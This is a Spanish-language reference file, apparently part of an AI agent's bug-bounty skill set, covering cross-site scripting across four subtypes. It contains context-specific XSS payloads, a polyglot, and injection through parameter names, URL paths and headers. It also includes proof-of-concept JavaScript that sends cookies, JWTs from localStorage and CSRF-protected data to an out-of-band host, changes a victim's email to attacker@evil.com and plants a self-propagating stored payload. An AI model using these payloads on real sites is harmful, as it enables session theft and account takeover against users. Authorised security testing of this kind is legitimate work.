# XSS — material común a los 4 subtipos

Cargado desde `xss-reflected`, `xss-dom`, `xss-blind` o `xss-stored` cuando
hace falta el detalle que no es específico de un subtipo. No es una skill
en sí misma — es referencia compartida.

---

## Contexto de reflexión → escape requerido

Determinar el contexto ANTES de elegir payload. Mandar el canary
`'"><img src=x onerror=alert(1)>` y ver dónde y cómo cae.

| Contexto | Ejemplo en HTML | Escape requerido |
|---|---|---|
| HTML body | `<div>INPUT</div>` | `<script>alert(1)</script>` o tag directo |
| Atributo (comilla doble) | `<input value="INPUT">` | `"><script>alert(1)</script>` |
| Atributo (comilla simple) | `<input value='INPUT'>` | `'><script>alert(1)</script>` |
| Atributo (sin comillas) | `<input value=INPUT>` | ` autofocus onfocus=alert(1)` |
| String JavaScript | `var x = "INPUT";` | `";alert(1)//` |
| JS sin comillas | `var x = INPUT;` | `alert(1)` directo |
| URL (href/src) | `<a href="INPUT">` | `javascript:alert(1)` |
| Style attribute | `style="background: INPUT;"` | `red;} body{background:url('javascript:alert(1)')` |
| `<title>` | `<title>INPUT</title>` | `</title><script>alert(1)</script>` |
| `<textarea>` | `<textarea>INPUT</textarea>` | `</textarea><script>alert(1)</script>` |
| Comentario HTML | `<!-- INPUT -->` | `--><script>alert(1)</script>` |
| `<noscript>` | `<noscript>INPUT</noscript>` | requiere víctima sin JS o cadena |
| XML text node | `<item>INPUT</item>` | `]]><script>alert(1)</script><!--` (CDATA breakout) |
| XML attribute | `<item id="INPUT">` | `" onload="alert(1)` (si el XML se parsea como HTML) |

**XSS Polygots — cuando no sabés el contexto todavía:**
Un polyglot es un payload que ejecuta en múltiples contextos simultáneamente.
Usar como primer canary cuando el contexto de reflexión es desconocido:

```
# Polyglot estándar (PortSwigger) — cubre HTML body, atributo, JS string
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e

# Polyglot compacto — cubre HTML body y atributo con y sin comillas
'"><img src=x onerror=alert(1)>

# Para cuando ' y " están ambas escapadas pero < > pasan:
<svg onload=alert(1)>

# Para JS context sin saber el tipo de quote:
\';alert(1)//
```

Si el polyglot completo llega crudo → examinar dónde cae para elegir el
payload mínimo que ejecuta en ese contexto específico.

**kxss cheatsheet** — si usás kxss, el output dice qué chars llegan sin encode:
- `<`, `>`, `"` todos sin encode → HTML body XSS trivial
- Solo `"` sin encode → attribute context solamente
- Solo `<`, `>` → tag injection posible, verificar si hay evento ejecutable
- Todos encoded → buscar JS context o DOM-based

---

## Sources adicionales — injection surface ampliada

**Nombre de parámetro (no solo el valor):**
Muchos frameworks citan el nombre del parámetro inválido en mensajes de error.
Probar payload en el nombre, no en el valor:

```
POST /form HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<img+onerror=alert(1)>=legit_value&legit_param=value
```

Rails, Laravel, ASP.NET MVC y Django han tenido este vector en errores de
binding/validation. El error dice `"Invalid field '<img onerror=alert(1)>'"`.

**URL Path segments:**
Inyectar en segmentos del path (no en query params). Frameworks con routing
dinámico extraen el segmento y lo usan para lookups que pueden fallar y
citar el valor en el error:

```
GET /user/<img onerror=alert(1)>/profile
GET /search/<script>alert(1)</script>/results
GET /api/v1/<payload>/items
```

Hasta 3 niveles de profundidad — más profundo raramente se refleja. Canary
first: `GET /user/PATHCANARY9/profile` y buscar `PATHCANARY9` en el response.

**Headers reflejados (más allá de User-Agent/Referer):**
```
X-Forwarded-For: <script>alert(1)</script>
X-Real-IP: <script>alert(1)</script>
X-Original-URL: /"><script>alert(1)</script>
X-Rewrite-URL: /"><script>alert(1)</script>
X-Custom-IP-Authorization: <payload>
```
Algunos proxies/WAFs inyectan estos headers en la request interna, y el
backend los puede reflejar en páginas de error o headers de response.

---

## Framework-specific gotchas

Cuando el fingerprint identifica el framework, estos son los sinks
peligrosos específicos donde el autoescapado falla o no aplica:

| Framework | API / patrón peligroso | Nota |
|---|---|---|
| **React 18/19** | `dangerouslySetInnerHTML`, `use()` hook con data sin sanitizar, hydration mismatch en SSR | Concurrent rendering puede crear race conditions |
| **Vue 3** | `v-html`, componente dinámico `<component :is="userValue">`, `renderToString()` en SSR | `v-html` con Composition API refs es especialmente riesgoso |
| **Angular 17+** | `bypassSecurityTrustHtml()`, `bypassSecurityTrustScript()`, `[innerHTML]` binding, custom elements | Signal-based XSS en SSR hydration |
| **Svelte 5** | `{@html userInput}`, event directives con data externa, `$state`/`$derived` con HTML | Fine-grained reactivity puede saltear sanitización |
| **Next.js 14/15** | `next/script strategy="beforeInteractive"` con data user-controlled, Server Actions sin validar | RSC serialization puede exponer data no esperada |
| **Astro 4** | `set:html` en `.astro` components, props no escapados en framework islands | Content collections sin sanitizar |
| **jQuery (legacy)** | `.html(userInput)`, `.append(userInput)`, `$(userInput)` cuando `userInput` es HTML | Muy común en apps legacy — buscar activamente |
| **Handlebars/Mustache** | `{{{triple_stash}}}` — triple stash no escapa | Double `{{}}` sí escapa, triple no |
| **EJS/Pug** | `<%- userInput %>` en EJS, `!{userInput}` en Pug — el `!` desactiva el escape | |

Cuando el framework usa autoescapado por default y no aparece ninguna de estas
APIs → killer para reflected/stored vía ese framework.

---

## Impact framing — convertir ejecución en bounty

Un `alert(1)` no es un finding. El PoC tiene que demostrar impacto real.
En orden de escalada:

**1. Cookie theft** (si `HttpOnly` NO está seteado):
```javascript
new Image().src='https://OOB/?c='+encodeURIComponent(document.cookie)
```

**2. Token/session desde localStorage** (cuando cookie es HttpOnly):
```javascript
fetch('https://OOB/?t='+localStorage.getItem('jwt'))
```

**3. CSRF token steal** (para encadenar con acción protegida):
```javascript
fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://OOB/?d='+btoa(t)))
```

**4. Acción state-changing directa** (el PoC que cierra solo):
```javascript
fetch('/api/v3/account/email',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({email:'attacker@evil.com'})})
```

**5. XSS persistente** (stored que se auto-propaga):
```javascript
fetch('/api/v3/profile',{method:'PATCH',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({bio:'<img src=x onerror=PAYLOAD>'})})
```

Analizar cookies antes de elegir el PoC:
- `HttpOnly` seteado → no hay cookie theft → ir a (2) o (4)
- `SameSite=Strict` → link crafteado no funciona para reflected → necesitás stored o blind
- `SameSite=Lax` → link click funciona → reflected es explotable

---

## Encadenamiento — self-XSS no se descarta automático

Self-XSS no se descarta solo por afectar únicamente al usuario que lo
inyecta. Preguntar: ¿hay forma de forzar que OTRO lo ejecute?

- **CSRF + Self-XSS** — forzar a la víctima a submitear el payload vía CSRF.
- **Login CSRF + Self-XSS** — loguear a la víctima en cuenta controlada
  y disparar el self-XSS ahí.
- **Cookie tossing** — setear una cookie desde un subdominio que dispara
  el XSS en el dominio principal.

---

## Variants siempre rechazadas

No gastar tiempo confirmando PoC en estos casos:
- Self-XSS sin cadena viable (CSRF/login CSRF/cookie tossing — ver arriba)
- XSS que requiere extensión de browser
- XSS vía header injection que necesita MITM
- XSS en página de logout o 404 sin impacto demostrable
- XSS bloqueado por CSP sin bypass disponible

---

## Cleanup (targets en producción)

Si el storage point es un target vivo con usuarios reales (comentario,
perfil, ticket, review), borrar o editar el payload apenas se confirma
la ejecución. No dejarlo persistiendo — hay gente real viendo eso.

---

## Referencias profundas (cargar solo si corresponde)

- `vector-catalog.md` + `portswigger-vectors.json` — selección de vectores
  del catálogo PortSwigger a partir del filter map de `filter-probing.md`.
  Cargar solo después de tener ese filter map.
- `filter-probing.md` — metodología para caracterizar el filtro antes de
  elegir payload. Cargar cuando hay reflexión/persistencia confirmada
  contra un filtro que bloquea o transforma el input.
- `bypass-techniques.md` — técnicas de evasión de filtros, aplican a los
  4 subtipos por igual. Cargar solo cuando ya hay reflexión/persistencia
  confirmada y hace falta el bypass.
- `constructive-synthesis.md` — cuando vector-catalog devuelve 0
  candidatos y el contexto es JS ejecutado directamente: construir el
  payload razonando sobre primitivas del lenguaje.
- `client-side-prototype-pollution.md` — source (parsers tipo
  `deparam`/`parseParams`), gadgets DOM y bypass de sanitizers de keys
  no-recursivos. Cargar cuando el sink es DOM-based y el source es un
  objeto armado por un parser propio del bundle.
- `wild-signals.md` — casos reales documentados (ej: Automattic/Pressable,
  config persistido que se renderiza sin escapar en panel admin).
- `../../output_format_enumerator/SKILL.md` — cuando el fingerprint
  detecta software open-source con arquitectura de plugins/renderers
  (MediaWiki, Drupal, WordPress, ArcGIS Server, etc.): enumerar formatos
  alternativos leyendo el código fuente real antes de fuzzear.
